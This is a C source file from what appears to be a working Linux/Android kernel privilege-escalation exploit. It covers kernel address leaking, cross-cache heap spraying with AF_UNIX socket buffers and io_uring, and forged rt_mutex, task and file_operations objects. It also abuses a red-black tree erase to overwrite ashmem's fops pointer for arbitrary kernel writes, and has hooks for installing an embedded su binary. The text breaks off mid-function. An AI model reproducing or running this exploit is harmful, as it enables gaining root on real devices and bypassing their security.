#include "common.h"
#include "kernelsnitch/kernelsnitch.h"

static struct kernelsnitch_shared_state *ks;
static size_t mm_objs_per_slab;
static int pcpshape_ring_fd = -1;
static struct mm_ctx prepare_ctx;
static struct mm_ctx spray_ctx;
static struct mm_ctx pre_ctx;
static struct mm_ctx post_ctx;
static pid_t child_leak;
#define SKB_SEND_SIZE (20000)
/*
 * cg-4k object spray payload: SKB_DATA_ALIGN(3400) +
 * SKB_DATA_ALIGN(shinfo ~340B) = 3840B -> kmalloc-cg-4k,
 * same cache as 64-slot pipe_buffer arrays. AF_UNIX skb data
 * uses GFP_KERNEL_ACCOUNT (af_unix.c: sk->sk_allocation).
 * NOTE: CONFIG_SYSVIPC is off on this kernel, msg_msg unusable.
 */
#define SKB_CG4K_DATA_SZ 3400
/*
 * True order-2 reclaim page via AF_UNIX frag (af_unix.c
 * unix_stream_send_generic + alloc_skb_with_frags math):
 *   SKB_MAX_HEAD(0) = 4096 - 384 = 3712 (linear head limit)
 *   data_len = min(size, PAGE_ALIGN(size - 3712))
 * Payload MUST be exactly 16384: data_len=16384, npages=4 ->
 * alloc_pages(order=2) as ONE compound page, no linear head.
 * WARNING: 12000 looks close but gives npages=3 -> order-1 +
 * order-0 frags, which SPLITS the freed mm_struct order-2 page
 * instead of reclaiming it whole (breaks stage-2 pairing).
 * 20000 gives order-2 frag + a cg-4k linear head (4032B).
 */
#define SKB_O2_DATA_SZ 16384
/*
 * 1k object spray: SKB_DATA_ALIGN(512) +
 * SKB_DATA_ALIGN(shinfo 384) = 896B linear head -> kmalloc-1k,
 * same cache as 16-slot pipe_buffer arrays (16*40B = 640B) on
 * this kernel (no per-memcg kmalloc caches, __GFP_ACCOUNT ignored).
 */
#define SKB_CG1K_DATA_SZ 512
uintptr_t page_base;
uintptr_t fake_lock;
uintptr_t fake_w0;
uintptr_t fake_task;
uintptr_t fake_parent;
uintptr_t fake_right;
uintptr_t fake_left;
uintptr_t fake_fops;
uintptr_t binwrite_target;
char ashmem_path[256] = "/dev/ashmem";
static unsigned char *skb_buf = NULL;
static struct iovec __iov_2_order;
static struct msghdr __m_2_order;
static struct iovec __iov_3_order;
static struct msghdr __m_3_order;
static struct iovec __iov_cg4k;
static struct msghdr __m_cg4k;
static struct iovec __iov_o2;
static struct msghdr __m_o2;
static struct iovec __iov_cg1k;
static struct msghdr __m_cg1k;
void sk_buff_init(void)
{
    if(skb_buf){
      free(skb_buf);
    }
    skb_buf = (char *)malloc(65536);
    memset(skb_buf, 0, 65536);
    __iov_2_order.iov_base = skb_buf;
    __iov_2_order.iov_len = 20000;
    __m_2_order.msg_iov = &__iov_2_order;
    __m_2_order.msg_iovlen = 1;
    __iov_3_order.iov_base = skb_buf;
    __iov_3_order.iov_len = 65536;
    __m_3_order.msg_iov = &__iov_3_order;
    __m_3_order.msg_iovlen = 1;
    __iov_cg4k.iov_base = skb_buf;
    __iov_cg4k.iov_len = SKB_CG4K_DATA_SZ;
    __m_cg4k.msg_iov = &__iov_cg4k;
    __m_cg4k.msg_iovlen = 1;
    __iov_o2.iov_base = skb_buf;
    __iov_o2.iov_len = SKB_O2_DATA_SZ;
    __m_o2.msg_iov = &__iov_o2;
    __m_o2.msg_iovlen = 1;
    __iov_cg1k.iov_base = skb_buf;
    __iov_cg1k.iov_len = SKB_CG1K_DATA_SZ;
    __m_cg1k.msg_iov = &__iov_cg1k;
    __m_cg1k.msg_iovlen = 1;
}
void sk_buff_prepare(int *sv)
{
    SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, sv));
    /*
     * unix_stream_send_generic clamps the per-skb size to
     * (sk_sndbuf >> 1) - 64; keep it well above 16KB so the
     * order-2 frag path (SKB_O2_DATA_SZ) never degrades into
     * split order-1/order-0 frags.
     */
    int sndbuf = 1 << 20;
    setsockopt(sv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
}

void sk_buff_alloc_2_order_page(int *sv)
{
    SYSCHK(sendmsg(sv[0], &__m_2_order, 0));
}

void sk_buff_alloc_3_order_page(int *sv)
{
    SYSCHK(sendmsg(sv[0], &__m_3_order, 0));
}

void sk_buff_release(int *sv)
{
    SYSCHK(close(sv[0]));
    SYSCHK(close(sv[1]));
}

/* cg-4k object spray for cross-cache stage 2 (see SKB_CG4K_DATA_SZ) */
void sk_buff_alloc_cg4k(int *sv)
{
    SYSCHK(sendmsg(sv[0], &__m_cg4k, 0));
}
/* true order-2 page alloc for cross-cache stage 1 (see SKB_O2_DATA_SZ) */
void sk_buff_alloc_o2_page(int *sv)
{
    SYSCHK(sendmsg(sv[0], &__m_o2, 0));
}
/* cg-1k object spray for cross-cache stage 2 (see SKB_CG1K_DATA_SZ) */
void sk_buff_alloc_cg1k(int *sv)
{
    SYSCHK(sendmsg(sv[0], &__m_cg1k, 0));
}
void setup_kernelsnitch(void) {
  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
  ks = kernelsnitch_setup(
      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0, 0);
}

int kernelsnitch_collisions_ready(void) {
  return kernelsnitch_found_collisions(ks);
}

void run_kernelsnitch_bruteforce(void) {
  kernelsnitch_bruteforce(ks);
}

uintptr_t current_kernelsnitch_mm_struct(void) {
  return ks->mm_struct;
}

uintptr_t cleanup_kernelsnitch(void) {
  uintptr_t leaked = kernelsnitch_cleanup(ks);
  ks = NULL;
  return leaked;
}

__attribute__((weak))
int install_embedded_su(pid_t *daemon_pid) {
  if (daemon_pid) {
    *daemon_pid = -1;
  }
  errno = ENOSYS;
  return 0;
}

__attribute__((weak))
int install_embedded_wallpaper(void) {
  errno = ENOSYS;
  return 0;
}

__attribute__((weak))
int install_embedded_exp32(void) {
  errno = ENOSYS;
  return 0;
}

void read_first_line(const char *path, char *buf, size_t len) {
  if (!len) {
    return;
  }
  snprintf(buf, len, "unreadable");
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    return;
  }
  ssize_t n = read(fd, buf, len - 1);
  int saved_errno = errno;
  close(fd);
  if (n <= 0) {
    errno = saved_errno;
    snprintf(buf, len, "unreadable");
    return;
  }
  buf[n] = 0;
  buf[strcspn(buf, "\r\n")] = 0;
}

void log_startup_context(void) {
  char attr[256];
  char enforce[32];
  char status[4096];
  char limits[160] = "NoNewPrivs=? Seccomp=? Seccomp_filters=?";
  read_first_line("/proc/self/attr/current", attr, sizeof(attr));
  read_first_line("/sys/fs/selinux/enforce", enforce, sizeof(enforce));
  int fd = open("/proc/self/status", O_RDONLY | O_CLOEXEC);
  if (fd >= 0) {
    ssize_t n = read(fd, status, sizeof(status) - 1);
    close(fd);
    if (n > 0) {
      status[n] = 0;
      const char *names[] = {"NoNewPrivs:", "Seccomp:", "Seccomp_filters:"};
      char values[3][32] = {"?", "?", "?"};
      for (size_t i = 0; i < 3; i++) {
        char *p = strstr(status, names[i]);
        if (p) {
          p += strlen(names[i]);
          while (*p == '\t' || *p == ' ') {
            p++;
          }
          size_t len = strcspn(p, "\r\n");
          if (len >= sizeof(values[i])) {
            len = sizeof(values[i]) - 1;
          }
          memcpy(values[i], p, len);
          values[i][len] = 0;
        }
      }
      snprintf(limits, sizeof(limits), "NoNewPrivs=%s Seccomp=%s "
               "Seccomp_filters=%s", values[0], values[1], values[2]);
    }
  }
  pr_success("startup context pid=%d uid=%u euid=%u gid=%u egid=%u attr=%s enforce=%s\n",
             getpid(), getuid(), geteuid(), getgid(), getegid(), attr,
             enforce);
  pr_success("startup limits pid=%d %s\n", getpid(), limits);
  pr_success("build config pid=%d label=%s\n",
             getpid(), BUILD_VARIANT_LABEL);
  pr_success("p0 profile pid=%d phys_offset=%016llx kernel_phys_load=%016llx "
             "delta=%016llx slide_logger=%016llx bootid_data=%016llx "
             "init_task=%016llx root_tg=%016llx sysctl_bootid=%016llx\n",
             getpid(), (unsigned long long)P0_PHYS_OFFSET,
             (unsigned long long)P0_KERNEL_PHYS_LOAD,
             (unsigned long long)P0_KERNEL_PHYS_DELTA,
             (unsigned long long)SLIDE_NFULNL_LOGGER,
             (unsigned long long)SLIDE_RANDOM_BOOT_ID_DATA,
             (unsigned long long)SLIDE_INIT_TASK,
             (unsigned long long)SLIDE_ROOT_TASK_GROUP,
             (unsigned long long)SLIDE_SYSCTL_BOOTID);
}

void log_slide_child_context(void) {
  char attr[256];
  char enforce[32];
  read_first_line("/proc/self/attr/current", attr, sizeof(attr));
  read_first_line("/sys/fs/selinux/enforce", enforce, sizeof(enforce));
  pr_success("slide child context route=%s pid=%d uid=%u euid=%u gid=%u "
             "egid=%u attr=%s enforce=%s\n",
             "pselect", getpid(), getuid(), geteuid(), getgid(), getegid(),
             attr, enforce);
}

void disable_rseq_for_thread(void) {
  return;
}

long futex_op(uint32_t *uaddr, int op, uint32_t val,
              const struct timespec *timeout, uint32_t *uaddr2,
              uint32_t val3) {
  return syscall(SYS_futex, uaddr, op, val, timeout, uaddr2, val3);
}

long sched_setattr_tid(int tid, int nice_value) {
  struct local_sched_attr attr;
  memset(&attr, 0, sizeof(attr));
  attr.size = sizeof(attr);
  attr.sched_policy = SCHED_BATCH;
  attr.sched_nice = nice_value;
  return syscall(SYS_sched_setattr, tid, &attr, 0);
}

int try_cache_ashmem_path(const char *path) {
  int fd = open(path, O_RDWR | O_CLOEXEC);
  if (fd < 0) {
    return 0;
  }

  close(fd);
  snprintf(ashmem_path, sizeof(ashmem_path), "%s", path);
  return 1;
}

int same_rdev_path(const char *path, dev_t rdev) {
  struct stat st;
  if (stat(path, &st) != 0) {
    return 0;
  }
  return S_ISCHR(st.st_mode) && st.st_rdev == rdev;
}

void init_ashmem_path(void) {
  char boot_id[128];
  int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
  if (fd >= 0) {
    ssize_t n = read(fd, boot_id, sizeof(boot_id) - 1);
    close(fd);
    if (n > 0) {
      boot_id[n] = 0;
      boot_id[strcspn(boot_id, "\r\n")] = 0;

      char path[256];
      snprintf(path, sizeof(path), "/dev/ashmem%s", boot_id);
      if (try_cache_ashmem_path(path)) {
        return;
      }
    }
  }

  struct stat base;
  int have_base = stat("/dev/ashmem", &base) == 0;
  have_base = have_base && S_ISCHR(base.st_mode);
  DIR *dir = opendir("/dev");
  if (dir && have_base) {
    struct dirent *de;
    while ((de = readdir(dir)) != NULL) {
      if (strncmp(de->d_name, "ashmem", 6) != 0 ||
          strcmp(de->d_name, "ashmem") == 0) {
        continue;
      }

      char path[256];
      snprintf(path, sizeof(path), "/dev/%s", de->d_name);
      if (same_rdev_path(path, base.st_rdev) &&
          try_cache_ashmem_path(path)) {
        closedir(dir);
        return;
      }
    }
  }
  if (dir) {
    closedir(dir);
  }
}

int open_ashmem_device(void) {
  return SYSCHK(open(ashmem_path, O_RDWR | O_CLOEXEC));
}

int has_zero_byte(uintptr_t value) {
  for (int i = 0; i < 8; i++) {
    if (((value >> (i * 8)) & 0xff) == 0) {
      return 1;
    }
  }
  return 0;
}

uintptr_t p0_data_alias(uintptr_t image_addr) {
  uintptr_t off = image_addr - KIMAGE_TEXT_BASE;
  uintptr_t phys = P0_KERNEL_PHYS_LOAD + off;
  return ((phys - P0_PHYS_OFFSET) | P0_PAGE_OFFSET);
}

uintptr_t p0_alias_image_offset(uintptr_t data_alias) {
  return (data_alias - P0_PAGE_OFFSET) - P0_KERNEL_PHYS_DELTA;
}

uintptr_t data_addr(uintptr_t image_addr) {
  return p0_data_alias(image_addr);
}

uintptr_t kaslr_image_addr(uintptr_t image_addr) {
  if (!kaslr_done) {
    return image_addr;
  }
  return kaslr_base + (image_addr - KIMAGE_TEXT_BASE);
}

uintptr_t text_addr(uintptr_t image_addr) {
  return kaslr_image_addr(image_addr);
}

uintptr_t slide_canon_addr(uintptr_t data_alias) {
  return kaslr_base + p0_alias_image_offset(data_alias);
}

uintptr_t canon_addr(uintptr_t image_addr) {
  return text_addr(image_addr);
}

void put64(unsigned char *p, size_t off, uint64_t value) {
  memcpy(p + off, &value, sizeof(value));
}

void put32(unsigned char *p, size_t off, uint32_t value) {
  memcpy(p + off, &value, sizeof(value));
}

// void put_fake_fops_table(unsigned char *p, size_t off) {
//   put64(p, off + FOPS_OWNER_OFF, 0);
//   // 估计是为了满足条件?
//   // put64(p, off + FOPS_LLSEEK_OFF,
//   //       fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
//   put64(p, off + FOPS_LLSEEK_OFF, 0);
//   put64(p, off + FOPS_READ_OFF, 0);
//   put64(p, off + FOPS_WRITE_OFF, 0);
//   put64(p, off + FOPS_READ_ITER_OFF, text_addr(CONFIGFS_READ_FILE));
//   put64(p, off + FOPS_WRITE_ITER_OFF, text_addr(CONFIGFS_BIN_WRITE_FILE));
//   put64(p, off + FOPS_IOCTL_OFF, text_addr(ASHMEM_IOCTL));
//   put64(p, off + FOPS_COMPAT_IOCTL_OFF, text_addr(ASHMEM_COMPAT_IOCTL));
//   put64(p, off + FOPS_MMAP_OFF, text_addr(ASHMEM_MMAP));
//   // put64(p, off + FOPS_OPEN_OFF, 0);//test?
//   put64(p, off + FOPS_OPEN_OFF, text_addr(ASHMEM_OPEN));
//   put64(p, off + FOPS_RELEASE_OFF, text_addr(ASHMEM_RELEASE));
//   put64(p, off + FOPS_SPLICE_READ_OFF, text_addr(COPY_SPLICE_READ));
//   put64(p, off + FOPS_SHOW_FDINFO_OFF, text_addr(ASHMEM_SHOW_FDINFO));
// }
void put_fake_fops_table(unsigned char *p, size_t off) {
  put64(p, off + FOPS_OWNER_OFF, 0);
  put64(p, off + FOPS_LLSEEK_OFF, 0);
  put64(p, off + FOPS_READ_OFF, text_addr(CONFIGFS_READ_FILE));
  put64(p, off + FOPS_WRITE_OFF, text_addr(CONFIGFS_BIN_WRITE_FILE));
  // put64(p, off + FOPS_WRITE_OFF, 0);
  // make read & write controlled by us
  // put64(p, off + FOPS_READ_ITER_OFF, 0);
  put64(p, off + FOPS_READ_ITER_OFF, 0);
  put64(p, off + FOPS_WRITE_ITER_OFF, 0);
  put64(p, off + FOPS_IOCTL_OFF, text_addr(ASHMEM_IOCTL));
  put64(p, off + FOPS_COMPAT_IOCTL_OFF, text_addr(ASHMEM_COMPAT_IOCTL));
  put64(p, off + FOPS_MMAP_OFF, text_addr(ASHMEM_MMAP));
  put64(p, off + FOPS_OPEN_OFF, text_addr(ASHMEM_OPEN));
  put64(p, off + FOPS_RELEASE_OFF, text_addr(ASHMEM_RELEASE));
  put64(p, off + FOPS_SPLICE_READ_OFF, 0);
  // put64(p, off + FOPS_SPLICE_READ_OFF, text_addr(COPY_SPLICE_READ));
  put64(p, off + FOPS_SHOW_FDINFO_OFF, text_addr(ASHMEM_SHOW_FDINFO));
}
int try_put_blob_no_zeros(int fd, const unsigned char *blob, size_t len) {
  char name[ASHMEM_NAME_LEN];
  memset(name, 0x41, sizeof(name));

  for (size_t i = 0; i < len; i++) {
    name[i] = blob[i] ? blob[i] : 1;
  }
  name[len] = 0;
  return ioctl(fd, ASHMEM_SET_NAME, name);
}

int try_put_blob_zero_at(int fd, const unsigned char *blob, size_t pos) {
  char name[ASHMEM_NAME_LEN];
  memset(name, 0x41, sizeof(name));

  for (size_t i = 0; i < pos; i++) {
    name[i] = blob[i] ? blob[i] : 1;
  }
  name[pos] = 0;
  return ioctl(fd, ASHMEM_SET_NAME, name);
}

int try_set_ashmem_name_blob(int fd, const unsigned char *blob, size_t len) {
  if (try_put_blob_no_zeros(fd, blob, len) != 0) {
    return -1;
  }

  for (size_t i = len; i > 0; i--) {
    if (blob[i - 1] == 0 &&
        try_put_blob_zero_at(fd, blob, i - 1) != 0) {
      return -1;
    }
  }
  return 0;
}

pid_t clone_child(void) {
  pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
  if (child == 0) {
    SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
    if (getppid() == 1) {
      _exit(0);
    }
    pin_to_core(CORE);
    for (;;) {
      pause();
    }
  }
  return child;
}

pid_t clone_leak_child(void) {
  pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
  if (child == 0) {
    kernelsnitch_find_collisions(ks);
    exit(0);
  }
  return child;
}

int open_memfd(pid_t child) {
  char path[64];
  snprintf(path, sizeof(path), "/proc/%d/mem", child);
  return SYSCHK(open(path, O_RDONLY));
}

void kill_child(pid_t child) {
  if (child <= 0) {
    return;
  }
  SYSCHK(kill(child, SIGKILL));
  SYSCHK(waitpid(child, NULL, 0));
}

void close_reclaim_sockets(void) {
  if(pcpshape_ring_fd >= 0) {
    close(pcpshape_ring_fd);
    pcpshape_ring_fd = -1;
  }
}

void close_ctx_memfds(struct mm_ctx *ctx) {
  for (size_t i = 0; i < ctx->mm_cnt; i++) {
    if (ctx->memfds[i] > 0) {
      close(ctx->memfds[i]);
      ctx->memfds[i] = -1;
    }
  }
}

void free_ctx_storage(struct mm_ctx *ctx) {
  free(ctx->childs);
  free(ctx->memfds);
  ctx->childs = NULL;
  ctx->memfds = NULL;
  ctx->mm_cnt = 0;
}

void cleanup_page_prepare_state(void) {
  close_ctx_memfds(&prepare_ctx);
  close_ctx_memfds(&spray_ctx);
  close_ctx_memfds(&pre_ctx);
  close_ctx_memfds(&post_ctx);
  if (memfd_leak > 0) {
    close(memfd_leak);
    memfd_leak = -1;
  }
  free_ctx_storage(&prepare_ctx);
  free_ctx_storage(&spray_ctx);
  free_ctx_storage(&pre_ctx);
  free_ctx_storage(&post_ctx);
  free(skb_buf);
  skb_buf = NULL;
}

int clone_memfd(void) {
  pid_t child = clone_child();
  int fd = open_memfd(child);
  kill_child(child);
  return fd;
}

void prepare_ctxs(void) {
  prepare_ctx.mm_cnt = 32 * mm_objs_per_slab;
  prepare_ctx.childs = calloc(sizeof(pid_t), prepare_ctx.mm_cnt);
  prepare_ctx.memfds = calloc(sizeof(int), prepare_ctx.mm_cnt);

  spray_ctx.mm_cnt = (1 + MM_PARTIALS) * mm_objs_per_slab;
  spray_ctx.childs = calloc(sizeof(pid_t), spray_ctx.mm_cnt);
  spray_ctx.memfds = calloc(sizeof(int), spray_ctx.mm_cnt);

  pre_ctx.mm_cnt = mm_objs_per_slab - 1;
  pre_ctx.childs = calloc(sizeof(pid_t), pre_ctx.mm_cnt);
  pre_ctx.memfds = calloc(sizeof(int), pre_ctx.mm_cnt);

  post_ctx.mm_cnt = mm_objs_per_slab;
  post_ctx.childs = calloc(sizeof(pid_t), post_ctx.mm_cnt);
  post_ctx.memfds = calloc(sizeof(int), post_ctx.mm_cnt);
}
/*
 * prepare_skb_payload — build fake kernel objects on the heap (skb payload).
 *
 * The heap layout is consumed by the stack-based rt_mutex_waiter exploit.
 * The key exploitation primitive is Write #2 of __rb_erase_augmented Case 2:
 *
 *   rb_set_parent(tmp, successor)  →  *(tmp+0) = rb_color(tmp) | successor
 *
 * Because rb_set_parent *preserves* the existing color of tmp, and
 * ASHMEM_MISC_FOPS holds an instruction-aligned kernel text pointer
 * (bit 0 = 0 ⇒ RB_RED), the write is a *clean* 8-byte store:
 *
 *   *(ASHMEM_MISC_FOPS) = fake_fops
 *
 * — thus replacing ashmem's file_operations pointer with our fake table.
 *
 * Critical heap invariants that make Case 2 safe:
 *   fake_fops + 0x08  (llseek)   = 0   →  child2 = NULL, Write #3  skipped
 *   fake_fops + 0x10  (read)     = 0   →  child->rb_left = 0 ⇒ Case 2
 *   fake_fops + 0x00  (owner)    = 0   →  rb_is_black() = false, rebalance NULL
 *
 * All three are satisfied by the memset(…, 0x00) + put_fake_fops_table()
 * combination below.
 */
int prepare_skb_payload(uintptr_t base) {
  memset(skb_buf, 0, SKB_SEND_SIZE);

  uintptr_t payload_base = base + SKB_DATA_DELTA;

  fake_lock = payload_base + LOCK_OFF;
  fake_task = payload_base + FAKE_TASK_OFF;
  fake_fops = payload_base + FOPS_TABLE_OFF;

  binwrite_target = payload_base + W0_OFF;

  uint64_t waiter_task = text_addr(INIT_TASK);
  uint64_t task_group  = text_addr(ROOT_TASK_GROUP);
  uint64_t pi_top_task = text_addr(INIT_TASK);
  size_t chunk = 0;

  do {
    unsigned char *p = skb_buf + chunk;

    /* fake_lock (rt_mutex) — owner=NULL for early exit */
    put32(p, LOCK_OFF + 0x00, 0);
    put64(p, LOCK_OFF + 0x08, 0);
    put64(p, LOCK_OFF + 0x10, 0);
    put64(p, LOCK_OFF + 0x18, 0);
    /* fake fops */
    put_fake_fops_table(p, FOPS_TABLE_OFF);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_USAGE_OFF, 0x100);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_NORMAL_PRIO_OFF, FAKE_TASK_PRIO);

    put32(p, FAKE_TASK_OFF + FAKE_WAITER_DEADLINE_OFF, 0);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_PI_LOCK_OFF, 0);
    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF, 0);
    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08, 0);
    put64(p, FAKE_TASK_OFF + FAKE_TASK_TASK_GROUP_OFF, task_group);
    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_TOP_TASK_OFF, pi_top_task);
    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_BLOCKED_ON_OFF, 0);
    // safety
    // put64(p, FOPS_TABLE_OFF + FOPS_LLSEEK_OFF, fake_fops + 0x40);
    // put64(p, FOPS_TABLE_OFF + FOPS_READ_OFF,  0x0);
    chunk += ORDER2_SIZE;
  } while (chunk + ORDER2_SIZE <= SKB_SEND_SIZE);

  return 1;
}
void shape_order2() {
  // shaping order-2 using io_uring_setup
  struct io_uring_params p;
  memset(&p, 0, sizeof(p));
  p.flags = IORING_SETUP_CQSIZE;
  p.sq_entries = 32;
  p.cq_entries = 512;

  pcpshape_ring_fd = syscall(__NR_io_uring_setup,
                            IO_URING_RECLAIM_ENTRIES, &p);
  if (pcpshape_ring_fd >= 0) {
    pr_info("io_uring shape: ring_fd=%d sq=%u cq=%u\n",
            pcpshape_ring_fd, p.sq_entries, p.cq_entries);
    } else {
      pr_warning("io_uring mmap(SQES) failed: errno=%d\n", errno);
      close(pcpshape_ring_fd);
      pcpshape_ring_fd = -1;
  }
}

#define BUDDY_DRAIN_COUNT 268
#define RECLAIM_ORDER MM_ORDER
#define RECLAIM_ATTEMPTS 12

static int buddy_drain_sv[BUDDY_DRAIN_COUNT][2];
static int reclaim_svs[RECLAIM_ATTEMPTS][2];

uintptr_t prepare_kernel_page() {
  static int retry_count = -1;
  retry_count++;
  mm_objs_per_slab = (PAGE_SIZE << MM_ORDER) / MM_STRUCT_SZ;
  prepare_ctxs();
  sk_buff_init();
  if(retry_count > 0){
    for (size_t i = 0; i < RECLAIM_ATTEMPTS; i++)
    {
      sk_buff_release(reclaim_svs[i]);
    }
  }
  
  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
    prepare_ctx.childs[i] = clone_child();
    prepare_ctx.memfds[i] = open_memfd(prepare_ctx.childs[i]);
  }

  for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
    spray_ctx.childs[i] = clone_child();
    spray_ctx.memfds[i] = open_memfd(spray_ctx.childs[i]);
  }

  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
  ks = kernelsnitch_setup(
      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0, 0);

  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    pre_ctx.childs[i] = clone_child();
  }
  child_leak = clone_leak_child();
  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
    post_ctx.childs[i] = clone_child();
  }

  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    pre_ctx.memfds[i] = open_memfd(pre_ctx.childs[i]);
  }
  memfd_leak = open_memfd(child_leak);
  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
    post_ctx.memfds[i] = open_memfd(post_ctx.childs[i]);
  }

  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    kill_child(pre_ctx.childs[i]);
  }
  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
    kill_child(post_ctx.childs[i]);
  }
  for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
    kill_child(spray_ctx.childs[i]);
  }
  SYSCHK(waitpid(child_leak, NULL, 0));

  if (!kernelsnitch_found_collisions(ks)) {
    pr_debug("KernelSnitch collision finding failed\n");
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
    return 0;
  }
  pr_debug("now leak mm_struct address\n");
  kernelsnitch_bruteforce(ks);
  uintptr_t leaked = ks->mm_struct;
  if (leaked == (uintptr_t)-1) {
    pr_debug("KernelSnitch mm_struct leak failed\n");
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
    return 0;
  }
  pr_success("KernelSnitch mm_struct leak 0x%llx\n", leaked);
  uintptr_t base = leaked & ~(((uintptr_t)1 << (12 + MM_ORDER)) - 1);
  pr_debug("leaked=0x%llx page_base=0x%llx\n", leaked, base);
  if (!prepare_skb_payload(base)) {
    pr_debug("Failed to prepare skb payload?\n");
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
    return 0;
  }
  // pr_info("prepare %d reclaim sk_buffs\n", RECLAIM_ATTEMPTS);
  // for (int r = 0; r < RECLAIM_ATTEMPTS; r++) {
  //   sk_buff_prepare(reclaim_svs[r]);
  //   int sndbuf = 1 << 20;
  //   setsockopt(reclaim_svs[r][0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
  //   int reclaim_flags = fcntl(reclaim_svs[r][0], F_GETFL, 0);
  //   if (reclaim_flags >= 0) {
  //     fcntl(reclaim_svs[r][0], F_SETFL, reclaim_flags | O_NONBLOCK);
  //   }
  // }
  /*
   * Buddy drain: consume order-2 pages to deplete freelists
   * (former PCP drain merged in — see BUDDY_DRAIN_COUNT).
   */
  pr_debug("buddy drain: %d order-%d pages\n", BUDDY_DRAIN_COUNT, MM_ORDER);
  for (int i = 0; i < BUDDY_DRAIN_COUNT; i++) {
    sk_buff_prepare(buddy_drain_sv[i]);
    if (MM_ORDER == 2)
      sk_buff_alloc_2_order_page(buddy_drain_sv[i]);
    else
      sk_buff_alloc_3_order_page(buddy_drain_sv[i]);
  }

  pr_debug("prepare %d reclaim sk_buffs\n", RECLAIM_ATTEMPTS);
  for (int r = 0; r < RECLAIM_ATTEMPTS; r++)
    sk_buff_prepare(reclaim_svs[r]);

  pin_to_core(CORE);

  /*
   * Stage 1: free mm_structs, reclaim at order-3 (handles coalescing).
   */
  pr_debug("free mm_structs + reclaim (order-%d, %d attempts)\n", RECLAIM_ORDER, RECLAIM_ATTEMPTS);
  for (size_t i = 0; i < pre_ctx.mm_cnt; i++)
    SYSCHK(close(pre_ctx.memfds[i]));
  for (size_t i = 0; i < post_ctx.mm_cnt - 1; i++)
    SYSCHK(close(post_ctx.memfds[i]));
  for (size_t i = 0; i < spray_ctx.mm_cnt; i += mm_objs_per_slab)
    SYSCHK(close(spray_ctx.memfds[i]));

  SYSCHK(close(memfd_leak));

  for (int r = 0; r < RECLAIM_ATTEMPTS; r++) {
    if (RECLAIM_ORDER == 2)
      sk_buff_alloc_2_order_page(reclaim_svs[r]);
    else
      sk_buff_alloc_3_order_page(reclaim_svs[r]);
  }

  pr_debug("(hopefully) reclaimed as %d-order sk_buff->frag page\n", MM_ORDER);


  kernelsnitch_cleanup(ks);
  ks = NULL;

  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
    SYSCHK(close(prepare_ctx.memfds[i]));
    prepare_ctx.memfds[i] = -1;
    kill_child(prepare_ctx.childs[i]);
  }
  // it's safe to release sk_buffs now
  for (int i = 0; i < BUDDY_DRAIN_COUNT; i++)
      sk_buff_release(buddy_drain_sv[i]);
  return base;
}


uintptr_t prepare_good_kernel_page() {
  // int max_attempts = KERNEL_PAGE_SETUP_ATTEMPTS;
  int max_attempts = FOPS_KERNEL_PAGE_SETUP_ATTEMPTS;
  for (int attempt = 1; attempt <= max_attempts; attempt++) {
    uintptr_t base = prepare_kernel_page();

    if (base) {
      return base;
    }
    pr_debug("prepare_kernel_page retry %d/%d\n", attempt,
             max_attempts);
  }
  pr_warning("prepare_kernel_page did not find usable nonzero source pointers\n");
  return 0;
}

ssize_t configfs_write_once(int fd, uintptr_t target, const void *data, size_t len) {
  unsigned char blob[128];
  memset(blob, 0x41, sizeof(blob));  /* fill non-zero: avoids zero-truncation */
  // put64(blob,0x5,target);
  // memset(blob+0x5 + 0x8,0x0,128-(0x5+0x8));
  for (size_t i = 0; i < sizeof(blob); i++)
  {
    blob[i] = i+1;
  }
  // /* mutex.owner at blob[21..28] = 0 for mutex_lock fast path */
  memset(blob + 21, 0, 8);
  // read_in_progress
  put32(blob, 0x54 - ASHMEM_NAME_PREFIX_LEN, 0);
  // put8(blob, 0x54 - ASHMEM_NAME_PREFIX_LEN, 0);
  // 很奇怪，值不对，可以利用read来修改ppos,然后移动到指定位置，骚操作吧!
  put64(blob, CFG_BIN_BUFFER_OFF - ASHMEM_NAME_PREFIX_LEN, target);
  // wired? ha?
